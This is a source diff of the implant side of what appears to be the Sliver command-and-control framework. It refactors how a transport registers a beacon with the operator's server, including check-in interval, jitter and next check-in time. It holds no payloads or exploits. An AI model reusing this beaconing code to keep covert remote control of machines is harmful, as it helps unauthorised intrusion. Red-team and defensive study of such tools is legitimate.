@@ -89,7 +89,7 @@ type C2 struct {
 
 	// Beacon - The transport can instantiate and use a Beacon client that matches
 	// the profile. This beacon is the equivalent of the above C2.Connection field
-	Beacon Beacon
+	Beacon *beacon
 
 	// {{if .Config.CommEnabled}}
 	// Comm - Each transport over which a Session Connection (above) is working also
@@ -190,12 +190,16 @@ func (t *C2) Start() (err error) {
 		return
 	}
 
+	// Register this session
+	t.Register()
+
 	// If the C2 profile is a Session, serve the appropriate handlers
 	if t.Profile.Type == sliverpb.C2Type_Session {
 		// {{if .Config.Debug}}
 		log.Printf("Running in Session mode (Transport ID: %s)", t.ID)
 		// {{end}}
 
+		// And serve it
 		go t.ServeSessionHandlers()
 	}
 
@@ -249,7 +253,8 @@ func (t *C2) Register() (err error) {
 	// Or register a beacon, wrapping the register into a special envelope.
 	if t.Profile.Type == sliverpb.C2Type_Beacon {
 		t.Connection.RequestSend(t.registerBeacon())
-		t.Beacon.Close() // RISKY WITH RACE CONDITIONS
+		// t.Beacon.Close() // RISKY WITH RACE CONDITIONS
+		t.Close() // RISKY WITH RACE CONDITIONS
 		time.Sleep(time.Second)
 	}
 
@@ -376,6 +381,26 @@ func (t *C2) registerSliver() *sliverpb.Register {
 		TransportID:      t.Profile.ID,
 		UUID:             sessUUID.String(),
 	}
+}
+
+// registerBeacon - Prepare a beacon registration message.
+func (t *C2) registerBeacon() *sliverpb.Envelope {
+	// nextBeacon := time.Now().Add(t.Beacon.Duration())
+	// return Envelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
+	//         ID:          BeaconID,
+	//         Interval:    t.Beacon.Interval(),
+	//         Jitter:      t.Beacon.Jitter(),
+	//         Register:    t.registerSliver(),
+	//         NextCheckin: nextBeacon.UTC().Unix(),
+	// })
+	nextBeacon := time.Now().Add(t.Duration())
+	return Envelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
+		ID:          BeaconID,
+		Interval:    t.Profile.Interval,
+		Jitter:      t.Profile.Jitter,
+		Register:    t.registerSliver(),
+		NextCheckin: nextBeacon.UTC().Unix(),
+	})
 }
 
 // registerSwitch - The transport is started following a request to switch
